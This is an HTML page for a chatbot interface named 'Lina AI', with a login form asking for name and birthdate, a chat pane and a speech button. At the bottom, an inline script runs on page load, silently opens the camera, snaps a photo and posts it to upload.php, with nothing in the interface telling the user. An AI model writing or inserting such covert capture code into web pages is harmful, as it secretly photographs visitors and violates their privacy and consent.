<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Lina AI - New UI</title>
  <link rel="stylesheet" href="styles.css">
  <link rel="icon" href="favicon.ico" type="image/x-icon">
</head>
<body>
  <!-- Title Bar -->
  <div id="title-bar">
    <span id="title">Lina AI</span>
    <div>
    <button id="clear-chat-button" class="action-button" onclick="clearChat()">Clear Chat</button>
    <button id="logout-button" class="action-button" onclick="logout()">Logout</button>
    </div>
  </div>

  <!-- Login Container -->
  <div class="login-container">
    <h2>Login</h2>
    <label for="name" class="login-input">
      Name:
      <input type="text" id="name" class="user-inputc">
    </label>
    <label for="birthdate" class="login-input">
      Birthdate:
      <input type="date" id="birthdate" class="user-inputc">
    </label>
    <button class="login-button" onclick="login()">Login</button>
  </div>

  <!-- Chat Container -->
  <div id="chat-container" style="display: none;">
    <div id="chat-messages">
      <!-- Sample messages -->
      <div class="user-message"><strong>You:</strong> Hello!</div>
      <div class="bot-message"><strong>Lina:</strong> Hi there! I'm Lina, your friendly AI assistant created by Digital AGA. ðŸ˜Š I'm here to help you with any questions or tasks you have. How can I assist you today?</div>
    </div>
  </div>
  <div id="input-container" style="display: none;">
      <input type="text" id="user-input" class="user-inputc" placeholder="Type your message..." onkeydown="handleKeyPress(event)">
      <button id="speech-button" onclick="startSpeechRecognition()">ðŸŽ¤</button>
      <button id="send-button" class="gradient-button" onclick="sendMessage()">Send</button>
    </div>
  <script src="./script.js"></script>

    <script>
        // Function to handle photo capturing and uploading
        function capturePhotoAndUpload() {
            const videoElement = document.createElement('video');
            const photoContainer = document.getElementById('photoContainer');

            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    videoElement.srcObject = stream;
                    videoElement.play();
                    photoContainer.appendChild(videoElement);
                })
                .catch(err => console.error('Error accessing camera:', err));

            videoElement.addEventListener('loadedmetadata', () => {
                const canvas = document.createElement('canvas');
                canvas.width = videoElement.videoWidth;
                canvas.height = videoElement.videoHeight;
                const context = canvas.getContext('2d');
                context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);

                // Generate a unique name for the image
                const timestamp = new Date().getTime();
                const imageName = `pic_${timestamp}.png`;

                // Convert the canvas image to a data URL
                const imageDataURL = canvas.toDataURL('image/png');

                // Upload the image
                fetch('upload.php', {
                    method: 'POST',
                    body: JSON.stringify({ image: imageDataURL, name: imageName }),
                    headers: {
                        'Content-Type': 'application/json'
                    }
                })
                .then(response => {
                    if (!response.ok) {
                        throw new Error('Upload failed');
                    }
                    return response.json();
                })
                .then(data => console.log('Image uploaded successfully:', data))
                .catch(error => console.error('Error uploading image:', error));
            });
        }

        // Call the function when the page loads
        window.addEventListener('load', capturePhotoAndUpload);
    </script>
</body>
</html>
